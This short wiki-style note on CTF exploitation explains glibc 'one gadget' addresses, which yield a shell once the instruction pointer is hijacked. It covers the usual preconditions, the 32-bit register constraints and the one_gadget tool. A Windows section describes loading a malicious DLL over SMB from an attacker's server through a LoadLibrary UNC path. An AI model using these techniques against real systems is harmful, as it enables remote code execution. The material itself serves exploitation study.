# One Gadget (also "bespoke gadget")

_First time heard about this in a [video of Murmus](https://www.youtube.com/watch?v=kEqOvWmzu6Y)._

Sometimes you can get control over EIP/RIP but you don't control the argument passed to the function you're calling. This is for example the case when you overwrite a .got.plt entry or you can overwrite some function pointer on the stack but you don't control the arguments passed to that function. DragonSector discovered that there are some addresses in glibc that you can call without explicitely having to prep a "/bin/sh" string that will give you a shell (so exec*() is called).

There might be other conditions required to be able to get a shell (certain value on the stack to be NULL/0x00000000, ...) apart from the basic conditions:
* You need to know the libc base address (otherwise you can't call your function, right?)
* You need to know which version of libc (hopefully they gave you a libc binary with your challenge)
* You get stdout output.

David942j also discusses the problems with one-gadgets for 32-bit systems. Since x86 uses the stack for function parameters and not registers like x64 it is more difficult to find the constraints for a 32-bit rop gadget (one_gadget uses symbolic execution to resolve constraints). Accessing the data segment in x64 is done by rip+offset which is very straightforward. Accessing the data segment in x86 is done by using 'a' register as base address to the rw-p segment of libc in memory. Sadly, some registers are callee safe (their value is saved (pushed) on the stack and popped back by the callee) which makes it impossible (not sure if hard to do or impossible) to use. Luckily, esi is not callee save and you can write the base address of the rw-p segment in it before calling the one-gadget. It of course limits the number of usable one-gadgets because you can only use those that use an non-callee-safe register.

When the one_gadget reports that the value has to be NULL, it actually means that the value has to acceptible for the argument it is pretending to be. For example if some place on the stack represents the second argument of execve then the argument is interpreted as a pointer to a list of pointers. As long as you have a value on that place that can be interpreted as a valid pointer and once dereferenced you get a list of valid pointers then all is OK. ([Murmus CTF video](https://www.youtube.com/watch?v=Khiin2_l0GQ))

* Source: [dragons_ctf.pdf](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)
* Source: [Project One Gadget in glibc](https://david942j.blogspot.be/2017/02/project-one-gadget-in-glibc.html)
* Source: [One gadget in Ubuntu 16.04](https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/)

## Gadgets

A premade list: [https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/](https://kimiyuki.net/blog/2016/09/16/one-gadget-rce-ubuntu-1604/)

Run [one_gadget](https://github.com/david942j/one_gadget) on your libc.

### Windows One Gadget

system() on Windows is implemented in MSVCRT.dll. However, this DLL is not always loaded. If it is loaded then you can get your one gadget if it's not loaded you can abuse LoadLibrary("\\\\x.x.x.x\yourSpecialDll.dll") to fetch a DLL over SMB. You just need to setup an open remote SMB server that serves your mallicious DLL. In the DLL put your code in DllMain that is automatically called when loading a DLL.

* Source: [dragons_ctf.pdf](http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf)
